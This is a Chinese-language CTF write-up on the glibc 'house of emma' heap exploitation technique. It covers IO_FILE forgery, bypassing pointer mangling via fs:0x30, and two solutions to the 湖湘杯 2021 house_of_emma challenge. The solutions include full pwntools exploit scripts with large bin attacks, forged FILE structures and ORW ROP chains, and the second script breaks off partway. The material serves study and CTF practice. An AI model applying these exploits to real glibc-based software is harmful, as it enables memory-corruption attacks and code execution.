[TOC]

# house of emma

## 利用条件

1. 可以写一个堆地址（large bin attack、tcache stach attack）
2. 触发IO流（FSOP、__malloc_assert）

## 利用的函数指针、以及触发的问题

1. house of emma 任然是在合法的范围内（过vtable检查）利用函数指针，从而劫持程序。emma利用的是 _IO_cookie_jumps存在的函数： _IO_cookie_read、 _IO_cookie_write、 _IO_cookie_seek、 _IO_cookie_close。

   下面看一下他们的函数原型，以及汇编：

   ![image-20240905193628901](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409051936992.png)

   ![image-20240905193742513](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409051937683.png)

   ![image-20240905193804100](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409051938387.png)

   ![image-20240905193708715](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409051937797.png)

   ![image-20240905193822240](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409051938502.png)

   ![image-20240905193842969](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409051938133.png)

   仔细观察汇编下的代码可以发现，在call rax 或者是 jmp rax之前都堆rax有一个解密的过程 `ror rax,0x11;xor    rax,QWORD PTR fs:0x30` 即一次循环移位 + 一次异或。

   这里的解密是由宏定义 PTR_DEMANGLE 指定的，添加这个指针加解密的是为了避免函数指针被 轻易利用：

   [PointerEncryption - glibc wiki (sourceware.org)](https://sourceware.org/glibc/wiki/PointerEncryption) 

   ![image-20240905194355101](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409051943158.png)

   `xor 异或的值在一个进程中是唯一的`，也就是启动一次程序，会赋予一个特定值，该值在本次程序运行时是唯一的。在其他的函数中也会被调用，例如 exit() 执行的过程中,调用到 `_dl_fini` 时也会进行指针解密 :

   ![image-20240905195001891](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409051950242.png)

   ![image-20240905195241264](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409051952525.png)

   ![image-20240905195538405](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409051955551.png)

   先从 initial 处取出被加密有的函数指针（程序加载时主动完成的），然后`ror rax,0x11;xor    rax,QWORD PTR fs:0x30`解密出原本的指针：

   ![image-20240905195804474](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409051958757.png)

2. 所以想要利用_IO_cookie_read 等函数 实现类似与hook的功能时，就必须将我们利用的指针(system/gadget 等)先进行加密，先异或再移位(`xor rax,QWORD PTR fs:0x30;ror rax,0x11`) 。

   但是实现 这个`异或的数值`我们并不知道 ，因此考虑的方法有两种：

   * 泄漏这个数值
   * 修改这个数值为我们已知的值

   两种方法各有优劣，泄漏一个数值 在堆题中就要先申请到该出的chunk，然后再show出来，需要的条件比较多。而修改这个数值就只需要 向上写一个地址即可 large bin attack 即可轻松完成，但是这也会引发一个问题 ---- 就是 如果改的时间过早 ，那么再其他函数执行的时候需要用到原本的特殊值 才能完成函数的调用，例如前面的exit 函数，并且我们在触发FSOP的时候还要借助 exit函数，如果在 `执行exit函数之前` 就覆盖了这个值就会导致执行的过程中报错。

3. 这里主要看如何使用第二种方法：

   考虑伪造两个IO_FILE，两个FILE通过_chain相连 ，在 _IO_flush_all_lockp的时候会先flush第一个FILE，再flush第二个FILE：这时，第一个FILE的作用就是修改 `fs:0x30` 上的值为我们已知的值 ，第二个FILE用来劫持程序。

   这个方法能利用的前提是，1. 第一个chunk如何改 这个特殊值，2. 并且保证在改后 在程序运行到 _IO_flush_all_lockp刷新第二个FILE前 都 `没有函数指着利用这个值进行函数调用` (否者就可能会报错)。

   * 先看第一个，如何修改这个特殊值，这里可以利用 [glibc 2.24 下 IO_FILE 的利用](https://blog.csdn.net/yjh_fnu_ltn/article/details/141431894?spm=1001.2014.3001.5501) 中的 _IO_str_overflow函数中的 memcpy (new_buf, old_buf, old_blen) ，如何 `伪造 IO_FILE` 来向指定位置复制 已知值 在 [house of pig](https://blog.csdn.net/yjh_fnu_ltn/article/details/141675464?spm=1001.2014.3001.5501) 中已经讲过：

   ![image-20240905202044935](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409052020026.png)

   * 再看第二个 保证在改掉 `fs:0x30`后一直到程序运行到 _IO_flush_all_lockp刷新第二个FILE前 都 `没有函数指着利用这个值进行函数调用` ，这里实际调试验证一下：

     从这里开始，观察有没有 `函数指针解密 + 调用` 的其概况出现

   ![image-20240905204359091](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409052043660.png)

   经过验证，直到flussh _IO_2_1_stdout_ 时都没有 `函数指针解密 + 调用` 的情况出现：

   ![image-20240905205220551](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409052052880.png)

4. 所以第二种方法 伪造两个 IO_FILE 是可以成立的。



## 利用：

1. 前面解决了函数指针的问题，现在看要`如何伪造这两个IO_FILE`才能，顺利执行到函数_IO_cookie_read调用的指针处呢。

2. 第一个FILE 用作覆盖 `fs:0x30` 使用，因此只需要考虑好绕过FSOP的检查，以及memcpy的参数即可。

3. 这里主要看第二个，如何伪造第二个FILE 来覆盖掉_IO_cookie_read原来的函数指针，即call rax 或者 jmp rax到我们指定的位置（这里先不看指针加密的位置，单看调用的过程），拿其中一个函数 _IO_cookie_read举例：

   ```c
   static _IO_ssize_t
   _IO_cookie_read (_IO_FILE *fp, void *buf, _IO_ssize_t size)
   {
     struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp; // 强制类型转化
     cookie_read_function_t *read_cb = cfile->__io_functions.read;
   #ifdef PTR_DEMANGLE
     PTR_DEMANGLE (read_cb);
   #endif
   
     if (read_cb == NULL)
       return -1;
   
     return read_cb (cfile->__cookie, buf, size);
   }
   ```

   这里传入的参数 fp 是我们伪造的 IO_FILE 地址，看一下 `_IO_cookie_file结构体` ，这个结构体实际上是_IO_FILE_plus结构体的扩展，后面加了另外两个结构：

   ![image-20240905213045484](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409052130548.png)

   ![image-20240905214410867](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409052144919.png)

   整体如下：

   ![image-20240905213907065](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409052139623.png)

   在_IO_cookie_read函数中，强制转换后直接通过 `cfile->__io_functions.read` 取到 _io_functions中的read函数地址，解密完后调用。(这里的成员 __io_functions是结构体本身，而不是指针，如果伪造地址直接在往IO_FILE往后继续构造即可，如果利用其中的read函数，就直接在 原本IO_FILE往后偏移为0x8的位置填入system/gadget地址即可)，read_cb函数传入的第一个参数 即rdi的值 就是成员 _cookie的值。

   伪造IO_FILE如下，vtable覆盖为 `_IO_cookie_read - 0x18` (保证_IO_flush_all_lockp能执行 _IO_cookie_read函数)，还有就是FSOP的绕过条件，这里不多将 [glibc 2.24 下 IO_FILE 的利用 ](https://blog.csdn.net/yjh_fnu_ltn/article/details/141431894?spm=1001.2014.3001.5501) :

   ![image-20240906151727627](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409061517296.png)

   进入 _IO_cookie_read 函数后取出：__io_functions中的read指针的值，进行解密操作，`rdi赋值为 _cookie字段的值`。最后衔接到system ：
   
   ![image-20240906152041058](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409061520828.png)
   
   这里如果要打栈迁移的话，直接将_cookie的值给位堆地址（上面固定偏移处写入 rsp、rcx寄存器的值），read直接给为setcontext + ? _addr <<< 0x11（如果将 rdi转化为 rdx就覆盖为其他的gadget）。
   
   

## 总结：

1. house of cat 实际上任然是利用 IO_FILE 的指针，其中一个思想就是连续伪造两个IO_FILE ：第一个覆盖 `fs:0x30` ，第二个 来覆盖 函数指针。
1. 如果在其他利用时，需要绕过`ror rax,0x11;xor    rax,QWORD PTR fs:0x30` 加密，就可以采用这种方法。（走house of cat其实是一种更好的选着，只需要伪造一个IO_FILE即可）

## 例题：

题目地址：[[湖湘杯 2021\]house_of_emma | NSSCTF](https://www.nssctf.cn/problem/828)

### 方法一：打 house of cat

先用`house of cat` 打一遍，使用__malloc_assert触发FSOP，因为上一篇 house of cat 打的是 exit触发的FSOP，这两种方法的IO_FILE构造有所不同。



#### 思路：

1. 先泄漏libc地址 和 堆地址 ，large bin attack 覆盖stderr ，在堆上伪造IO_FILE，修改top chunk的size（改小），再申请chunk触发__malloc_assert 的IO链

#### 分析：

1. 这题是一个vmp的pwn题，还是第一次见，但是对于我们这种逆向的pwn选手来说就是小菜一碟。

2. 分析一下函数对应的 `硬件编码` :

   * add --> 0x1       (index(一字节),size(两字节))
   * delete --> 0x2 （index（一字节））
   * show --> 0x3   （index（一字节））
   * edit --> 0x4      （index（一字节），data_size（两字节），data（data_size个字节））
   * return --> 0x5

3. 按照上面分析出来的结构建立下面的结构体，delete和show公用一个：

   ![image-20240906182229803](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409061822868.png)

4. 分析函数，add函数限制了size大小，delete函数存在UAF漏洞，edit函数本身没有溢出：

   ![image-20240906182350378](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409061823469.png)

#### 利用： 本地用的时libc2.32 解题

1. 先泄漏libc地址 和 堆地址，同时完成第一次large bin attack攻击：

   ```python
   # 泄漏libc
   add(0x4b0,15)    #15 隔开
   add(0x480,0)    #0
   add(0x4b0,15)    #15 隔开
   edit(15,b"./flag\x00")
   add(0x4a0,1)    #1
   add(0x4b0,15)    #15
   add(0x470,2)    #2
   add(0x4b0,15)    #15 隔开
   run()
   
   
   free(1)
   add(0x4b0,15)    #15 将chunk1放入large bin
   show(1)
   run()
   
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   libc_base = addr - 0x1E4010
   success("libc_addr==>"+hex(libc_base))
   
   #计算__free_hook和system地址
   setcontext_addr    = libc_base + libc.sym["setcontext"] + 61
   system_addr        = libc_base + libc.sym["system"]
   IO_2_1_stdout_addr = libc_base + libc.sym["_IO_2_1_stdout_"]
   IO_list_all_addr   = libc_base + libc.sym["_IO_list_all"]
   IO_wfile_jumps_addr = libc_base + libc.sym["_IO_wfile_jumps"]
   stderr_addr = libc_base + libc.sym["stderr"]
   # IO_wfile_jumps_addr = libc_base + 0x1E4F80
   
   success("system_addr==>"        + hex(system_addr))
   success("setcontext_addr==>"    + hex(setcontext_addr))
   success("IO_2_1_stdout_addr==>" + hex(IO_2_1_stdout_addr))
   success("IO_list_all_addr==>"   + hex(IO_list_all_addr))
   success("IO_wfile_jumps_addr==>"+ hex(IO_wfile_jumps_addr))
   success("stderr_addr==>"        + hex(stderr_addr))
   
   open_addr = libc.sym['open']+libc_base
   read_addr = libc.sym['read']+libc_base
   write_addr = libc.sym['write']+libc_base
   
   pop_rdi_ret=libc_base + 0x000000000002858f
   pop_rdx_r12_ret=libc_base + 0x0000000000114161
   pop_rax_ret=libc_base + 0x0000000000045580
   pop_rsi_ret=libc_base + 0x000000000002ac3f
   ret= libc_base + 0x0000000000026699
   
   
   # debug()
   # ========== large bin attack ==========
   # 泄漏堆地址 同时完成large bin attack 攻击 覆盖掉IO_list_all
   free(0)
   edit(1,p64(addr)*2 + p64(0) + p64(stderr_addr-0x20))
   add(0x4b0,15)    #15 将chunk0放入large bin 触发large bin attack
   show(1)
   run()
   p.recvuntil(b'Malloc Done\n')
   heap_addr = u64(p.recv(6).ljust(8,b'\x00'))-0x2760
   success("heap_addr==>"+hex(heap_addr))
   ```

   准备large bin attack：

   ![image-20240906182821940](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409061828121.png)

   覆盖stderr：

   ![image-20240906182850691](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409061828812.png)

2. 利用 large bin chunk在于top chunk相邻时，被释放后会与top chunk合并，在申请一个小一点的的chunk就会将`top chunk抬高` 这是就能覆盖到top chunk的size了：

   ```python
   # ========== 修改 top_chunk ==========
   add(0x4c0,15)   # 用来修改 top_chunk的size
   free(15)        # 提高 top_chunk 
   add(0x4b0,14)
   edit(15,b"\x00"*0x4b8 + p64(0x300))
   run()
   ```

   先申请一个大chunk：

   ![image-20240906183453521](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409061834601.png)

   free掉后再申请一个小一点的chunk，这时top chunk会被抬高0x10，刚好可以被上次覆盖的chunk覆盖到，就能利用上次free的chunk修改掉top chunk的size：

   ![image-20240906183511036](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409061835124.png)

   ![image-20240906183627921](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409061836983.png)

3. 伪造IO_FILE、ORW：

   ```py
   
   # ORW
   syscall = read_addr+16
   flag = heap_addr+0x2C00
   
   # open(0,flag)
   orw =p64(pop_rdi_ret)+p64(flag)
   orw+=p64(pop_rsi_ret)+p64(0)
   orw+=p64(pop_rax_ret)+p64(2)
   orw+=p64(syscall)
   # orw =p64(pop_rdi_ret)+p64(flag)
   # orw+=p64(pop_rsi_ret)+p64(0)
   # orw+=p64(open_addr)
   
   # read(3,heap+0x1010,0x30) 
   orw+=p64(pop_rdi_ret)+p64(3)
   orw+=p64(pop_rsi_ret)+p64(heap_addr+0x1010)     # 从地址 读出flag
   orw+=p64(pop_rdx_r12_ret)+p64(0x30)+p64(0)
   orw+=p64(read_addr)     
   
   # write(1,heap+0x1010,0x30)
   orw+=p64(pop_rdi_ret)+p64(1)
   orw+=p64(pop_rsi_ret)+p64(heap_addr+0x1010)     # 从地址 读出flag
   orw+=p64(pop_rdx_r12_ret)+p64(0x30)+p64(0)
   orw+=p64(write_addr)
   
   
   # ========== 伪造IO_FILE ==========
   chunk_addr = heap_addr + 0x2760     #当前large bin 的地址
   
   file = p64(0) + p64(0)                  #_IO_read_end    _IO_read_base
   file+= p64(0) + p64(0) + p64(0) #_IO_write_base  _IO_write_ptr _IO_write_end
   file+= p64(0) + p64(0)                  #_IO_buf_base    _IO_buf_end
   file+= p64(0) * 8                       #_IO_save_base ~ _codecvt
   file+= p64(heap_addr) + p64(0)*2        #_lock   _offset  _codecvt
   file+= p64(chunk_addr + 0xe0)           #_wide_data
   file+= p64(0) *3                        #_freeres_list ~ __pad5
   file+= p64(0) + p64(0)*2                # _mode  _unused2 (2dword)
   
   file+=p64(IO_wfile_jumps_addr + 0x10)   #vtable
   
   # ========== _IO_wide_data_2 ==========
   _wide_vtable = chunk_addr + 0xf0
   rdx_data     = chunk_addr + 0xf0
   stack_change = chunk_addr + 0x1d0
   
   file+= p64(0)*3                                      #_IO_read_ptr   _IO_read_end  _IO_read_base
   file+= p64(1) + p64(rdx_data) + p64(setcontext_addr) #_IO_write_base _IO_write_ptr _IO_write_end
   file+= p64(0) * 16 + p64(stack_change) + p64(ret)
   file+= p64(0) * 4
   file+= p64(_wide_vtable)          #_wide_vtable
   file+= p64(0)   #填充
   
   # ========== stack change ==========
   file+= orw
   debug()
   edit(0,file)
   add(0x4b0,15)   # 触发 __malloc_assert
   run()
   p.interactive()
   ```

   伪造的IO_FILE如下：

   ![image-20240906185314179](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409061853384.png)

   ![image-20240906185423457](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409061854533.png)

   ![image-20240906185516779](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409061855889.png)

   ![image-20240906185802581](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409061858927.png)

   

   这里要注意IO_FILE的 `_lock字段`要给一个可以写的地址，不然在触发__malloc_assert后会因为地址为问题报段错，这里看一下报错问题：

   条件不用管，其实也不可能和rbp的值相当，只需要地址合法即可：

   ![image-20240906184534156](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409061845601.png)

   ![image-20240906184951208](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409061849427.png)

   最后进入__vfwprintf_internal函数，调用到 _IO_wfile_seekoff：

   ![image-20240906185157461](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409061851763.png)

   这里发现进入_IO_wfile_seekoff函数时mode等于0，但是这次退出 _IO_wfile_seekoff函数后在后面又进去了，这次mode 即rcx的值不是0：

   ![image-20240906190209093](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409061902281.png)

   这里完成从rdi 到 rdx的转换，并进入setcontext+61：

   ![image-20240906190307186](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409061903344.png)

   setcontext+61完成栈迁移到堆上：

   ![image-20240906190352538](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409061903690.png)

   顺利衔接到堆上的ORW：

   ![image-20240906190417784](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409061904982.png)

4. 本地libc2.32的完整exp：远程的EXP在这里 [bkbqwq | NSSCTF](https://www.nssctf.cn/note/set/8349) 

   ```python
   from pwn import *
   from LibcSearcher import *
   context(os='linux', arch='amd64', log_level='debug')
   
   def debug():
       gdb.attach(p)
   
   # p = remote("node5.anna.nssctf.cn",28549)
   p = process("./pwn")
   # libc = ELF('./libc.so.6')
   
   libc = ELF('/home/kali/Desktop/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc-2.32.so')
   # elf = ELF("./pwn")
   
   
   opcode = b""
   def add(size,index):
       global opcode
       opcode += b"\x01" + p8(index) + p16(size)
       
   
   def edit(index, content):
       global opcode
       opcode += b"\x04" + p8(index) + p16(len(content)) + content
   
   def show(index):
       global opcode
       opcode += b"\x03" + p8(index)
   def free(index):
       global opcode
       opcode += b"\x02" + p8(index)
   
   def run():
       global opcode
       opcode += b"\x05"
       p.sendline(opcode)
       opcode = b""
   
   # 泄漏libc
   add(0x4b0,15)    #15 隔开
   add(0x480,0)    #0
   add(0x4b0,15)    #15 隔开
   edit(15,b"./flag\x00")
   add(0x4a0,1)    #1
   add(0x4b0,15)    #15
   add(0x470,2)    #2
   add(0x4b0,15)    #15 隔开
   run()
   
   
   free(1)
   add(0x4b0,15)    #15 将chunk1放入large bin
   show(1)
   run()
   
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   libc_base = addr - 0x1E4010
   success("libc_addr==>"+hex(libc_base))
   
   #计算__free_hook和system地址
   setcontext_addr    = libc_base + libc.sym["setcontext"] + 61
   system_addr        = libc_base + libc.sym["system"]
   IO_2_1_stdout_addr = libc_base + libc.sym["_IO_2_1_stdout_"]
   IO_list_all_addr   = libc_base + libc.sym["_IO_list_all"]
   IO_wfile_jumps_addr = libc_base + libc.sym["_IO_wfile_jumps"]
   stderr_addr = libc_base + libc.sym["stderr"]
   # IO_wfile_jumps_addr = libc_base + 0x1E4F80
   
   success("system_addr==>"        + hex(system_addr))
   success("setcontext_addr==>"    + hex(setcontext_addr))
   success("IO_2_1_stdout_addr==>" + hex(IO_2_1_stdout_addr))
   success("IO_list_all_addr==>"   + hex(IO_list_all_addr))
   success("IO_wfile_jumps_addr==>"+ hex(IO_wfile_jumps_addr))
   success("stderr_addr==>"        + hex(stderr_addr))
   
   open_addr = libc.sym['open']+libc_base
   read_addr = libc.sym['read']+libc_base
   write_addr = libc.sym['write']+libc_base
   
   pop_rdi_ret=libc_base + 0x000000000002858f
   pop_rdx_r12_ret=libc_base + 0x0000000000114161
   pop_rax_ret=libc_base + 0x0000000000045580
   pop_rsi_ret=libc_base + 0x000000000002ac3f
   ret= libc_base + 0x0000000000026699
   
   
   # debug()
   # ========== large bin attack ==========
   # 泄漏堆地址 同时完成large bin attack 攻击 覆盖掉IO_list_all
   free(0)
   edit(1,p64(addr)*2 + p64(0) + p64(stderr_addr-0x20))
   add(0x4b0,15)    #15 将chunk0放入large bin 触发large bin attack
   show(1)
   run()
   p.recvuntil(b'Malloc Done\n')
   heap_addr = u64(p.recv(6).ljust(8,b'\x00'))-0x2760
   success("heap_addr==>"+hex(heap_addr))
   
   # ========== 修改 top_chunk ==========
   add(0x4c0,15)   # 用来修改 top_chunk的size
   free(15)        # 提高 top_chunk 
   add(0x4b0,14)
   edit(15,b"\x00"*0x4b8 + p64(0x300))
   run()
   
   # ORW
   syscall = read_addr+16
   flag = heap_addr+0x2C00
   
   # open(0,flag)
   orw =p64(pop_rdi_ret)+p64(flag)
   orw+=p64(pop_rsi_ret)+p64(0)
   orw+=p64(pop_rax_ret)+p64(2)
   orw+=p64(syscall)
   # orw =p64(pop_rdi_ret)+p64(flag)
   # orw+=p64(pop_rsi_ret)+p64(0)
   # orw+=p64(open_addr)
   
   # read(3,heap+0x1010,0x30) 
   orw+=p64(pop_rdi_ret)+p64(3)
   orw+=p64(pop_rsi_ret)+p64(heap_addr+0x1010)     # 从地址 读出flag
   orw+=p64(pop_rdx_r12_ret)+p64(0x30)+p64(0)
   orw+=p64(read_addr)     
   
   # write(1,heap+0x1010,0x30)
   orw+=p64(pop_rdi_ret)+p64(1)
   orw+=p64(pop_rsi_ret)+p64(heap_addr+0x1010)     # 从地址 读出flag
   orw+=p64(pop_rdx_r12_ret)+p64(0x30)+p64(0)
   orw+=p64(write_addr)
   
   
   # ========== 伪造IO_FILE ==========
   chunk_addr = heap_addr + 0x2760     #当前large bin 的地址
   
   file = p64(0) + p64(0)                  #_IO_read_end    _IO_read_base
   file+= p64(0) + p64(0) + p64(0) #_IO_write_base  _IO_write_ptr _IO_write_end
   file+= p64(0) + p64(0)                  #_IO_buf_base    _IO_buf_end
   file+= p64(0) * 8                       #_IO_save_base ~ _codecvt
   file+= p64(heap_addr) + p64(0)*2        #_lock   _offset  _codecvt
   file+= p64(chunk_addr + 0xe0)           #_wide_data
   file+= p64(0) *3                        #_freeres_list ~ __pad5
   file+= p64(0) + p64(0)*2                # _mode  _unused2 (2dword)
   
   file+=p64(IO_wfile_jumps_addr + 0x10)   #vtable
   
   # ========== _IO_wide_data_2 ==========
   _wide_vtable = chunk_addr + 0xf0
   rdx_data     = chunk_addr + 0xf0
   stack_change = chunk_addr + 0x1d0
   
   file+= p64(0)*3                                      #_IO_read_ptr   _IO_read_end  _IO_read_base
   file+= p64(1) + p64(rdx_data) + p64(setcontext_addr) #_IO_write_base _IO_write_ptr _IO_write_end
   file+= p64(0) * 16 + p64(stack_change) + p64(ret)
   file+= p64(0) * 4
   file+= p64(_wide_vtable)          #_wide_vtable
   file+= p64(0)   #填充
   
   # ========== stack change ==========
   file+= orw
   debug()
   edit(0,file)
   add(0x4b0,15)   # 触发 __malloc_assert
   run()
   p.interactive()
   ```
   
   远程改一下libc偏移，和pop_r*的地址即可，伪造的IO_FILE不用修改
   
   ![image-20240906181355310](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409061906565.png)



### 方法二：打 house of emma （本地）

#### 思路：

1. 与上面的方法，仅在伪造IO_FILE上的偏移不同，并且伪造的gadget也不同（上面直接利用了_IO_wfile_seekoff函数中自带的gadget完成 rdi 到 rdx的转化）。
2. 并且要进行两次large bin attcck，一次挟持stderr，一次覆盖 `fs:0x30` 。这里由于使用的不是exit触发的FSOP，所以不用伪造两个IO_FILE，因为在 __malloc_assert触发 一直到  _vfwprintf_internal中执行 `call   qword ptr [r12 + 0x38]` 都没有使用到`fs:0x30` 这个指针（调试一遍就知道了），所以可以直接在IO链触发前就将`fs:0x30` 覆盖掉。

#### 利用：

1. 前面泄漏libc地址和堆地址就不多说了，直接从修改top chunk的size开始：

   ```python
   # ========== 修改 top_chunk ==========
   add(0x4c0,15)   # 用来修改 top_chunk的size
   free(15)        # 提高 top_chunk 
   add(0x4b0,14)
   edit(15,b"\x00"*0x4b8 + p64(0x700))
   run()
   
   # ========== large bin attack 覆盖 pointer_chk_guard==========
   free(2)
   pointer_chk_guard_addr = libc_base - 0x2890
   success("pointer_chk_guard_addr ==>" + hex(pointer_chk_guard_addr))
   edit(1,p64(addr)*3 + p64(pointer_chk_guard_addr-0x20))
   add(0x4b0,15)    #15 将chunk0放入large bin 触发large bin attack
   run()
   xor_key = heap_addr + 0x3A20
   success("xor_key ==>" + hex(xor_key))
   
   ```

   这里修改top chunk时给size大一点（页面对齐都无所谓），后面触发latge bin attack 还要使用top chunk:

   ![image-20240907155620151](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409071556412.png)

   成功覆盖为堆地址（之前在unsorted bin中的堆地址），就是我们构造函数指针的`异或值`：

   ![image-20240907155651644](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409071556759.png)

   1. 伪造IO_FILE，_lock中给一个堆地址，后面衔接的结构体中安排好rdi 和 rdx的值，以及加密后的函数指针`encrypt_gadget` ，和进行栈迁移用的rsp rcx寄存器值。这里gadget怎么寻找的看这篇 [exit_hook和setcontext](https://blog.csdn.net/yjh_fnu_ltn/article/details/141786731?spm=1001.2014.3001.5501):

   ```py
   
   # ========== 伪造IO_FILE 1 ==========
   chunk1_addr = heap_addr + 0x2760         #当前large bin 的地址 ==> 伪造IO_FILE的堆地址
   
   file  = p64(0) + p64(0)                  #_IO_read_end    _IO_read_base
   file += p64(0) + p64(0) + p64(0)         #_IO_write_base  _IO_write_ptr _IO_write_end
   file += p64(0) + p64(0)                  #_IO_buf_base    _IO_buf_end
   file += p64(0) * 8                       #_IO_save_base ~ _codecvt
   file += p64(heap_addr) + p64(0)*2        #_lock   _offset  _codecvt
   file += p64(0)                           #_wide_data
   file += p64(0) *3                        #_freeres_list ~ __pad5
   file += p64(0) + p64(0)*2                #_mode  _unused2 (2dword)
   file +=p64(_IO_cookie_jumps_addr + 0x38) #vtable
   
   rdi_data     = chunk1_addr + 0xf0
   rdx_data     = chunk1_addr + 0xf0
   stack_change = chunk1_addr + 0x1c0
   
   gadget = 0x000000000014b760 + libc_base
   encrypt_gadget = rotate_left_64(gadget^xor_key,0x11)
   # ========== cookie ==========
   file += p64(rdi_data)                    #__cookie
   file += p64(encrypt_gadget)              #__io_functions.read
   file += p64(0) + p64(rdx_data)           #_IO_write_base _IO_write_ptr
   file += p64(0)*2 + p64(setcontext_addr)  #gadget中call setcontext_addr
   
   file += p64(0) * 15 + p64(stack_change) + p64(ret) #setcontext+61传参
   file += p64(0) * 4
   ```

   伪造好后的IO_FILE如下，read字段中时加密好的gadget地址：

   ![image-20240907160211125](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409071602365.png)

   逐步调试走一遍：

   这里进入 _IO_cookie_read函数：

   ![image-20240907160330606](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409071603749.png)

   完成gadget指针的解密,并进入gadget，`在gadget中完成rdi到rdx的转换` ，并顺利衔接到setcontext + 61:

   ![image-20240907160431798](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409071604955.png)

   在setcontext + 61中，利用在堆上布置好的寄存器参数，完成栈迁移：

   ![image-20240907160638572](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409071606728.png)

   最后顺利衔接到堆上的ORW，并读取到flag：

   ![image-20240907160738795](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409071607015.png)![image-20240907160806654](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202409071608778.png)

2. 打本地的EXP，远程可能需要爆破一下TLS的地址（就是那个异或值的地址 fs:0x30）：

   ```python
   from pwn import *
   from LibcSearcher import *
   context(os='linux', arch='amd64', log_level='debug')
   
   def debug():
       gdb.attach(p)
   
   # p = remote("node5.anna.nssctf.cn",28549)
   p = process("./pwn")
   # libc = ELF('./libc.so.6')
   
   libc = ELF('/home/kali/Desktop/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc-2.32.so')
   # elf = ELF("./pwn")
   
   
   opcode = b""
   def add(size,index):
       global opcode
       opcode += b"\x01" + p8(index) + p16(size)
       
   
   def edit(index, content):
       global opcode
       opcode += b"\x04" + p8(index) + p16(len(content)) + content
   
   def show(index):
       global opcode
       opcode += b"\x03" + p8(index)
   def free(index):
       global opcode
       opcode += b"\x02" + p8(index)
   
   def run():
       global opcode
       opcode += b"\x05"
       p.sendline(opcode)
       opcode = b""
   
   # 加密函数 循环左移
   def rotate_left_64(x, n):
       # 确保移动的位数在0-63之间
       n = n % 64
       # 先左移n位
       left_shift = (x << n) & 0xffffffffffffffff
       # 然后右移64-n位，将左移时超出的位移动回来
       right_shift = (x >> (64 - n)) & 0xffffffffffffffff
       # 合并两部分
       return left_shift | right_shift
   
   # 泄漏libc
   add(0x4b0,15)    #15 隔开
   add(0x480,0)    #0
   add(0x4b0,15)    #15 隔开
   edit(15,b"./flag\x00")
   add(0x4a0,1)    #1
   add(0x4b0,13)    #15
   add(0x470,2)    #2
   add(0x4b0,15)    #15 隔开
   run()
   
   free(1)
   add(0x4b0,15)    #15 将chunk1放入large bin
   show(1)
   run()
   
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   libc_base = addr - 0x1E4010
   
   #计算__free_hook和system地址
   setcontext_addr    = libc_base + libc.sym["setcontext"] + 61
   system_addr        = libc_base + libc.sym["system"]
   IO_2_1_stdout_addr = libc_base + libc.sym["_IO_2_1_stdout_"]
   IO_list_all_addr   = libc_base + libc.sym["_IO_list_all"]
   IO_wfile_jumps_addr = libc_base + libc.sym["_IO_wfile_jumps"]
   _IO_str_jumps_addr = libc_base + 0x1E5580
   stderr_addr = libc_base + libc.sym["stderr"]
   _IO_cookie_jumps_addr = libc_base + 0x1E4A40
   
   success("libc_addr          ==>" + hex(libc_base))
   success("system_addr        ==>" + hex(system_addr))
   success("setcontext_addr    ==>" + hex(setcontext_addr))
   success("IO_2_1_stdout_addr ==>" + hex(IO_2_1_stdout_addr))
   success("IO_list_all_addr   ==>" + hex(IO_list_all_addr))
   success("IO_wfile _jumps_addr==>" + hex(IO_wfile_jumps_addr))
   success("stderr_add         ==>" + hex(stderr_addr))
   success("_IO_str_jumps_addr ==>" + hex(_IO_str_jumps_addr))
   success("_IO_cookie_jumps_addr ==>" + hex(_IO_cookie_jumps_addr))
   
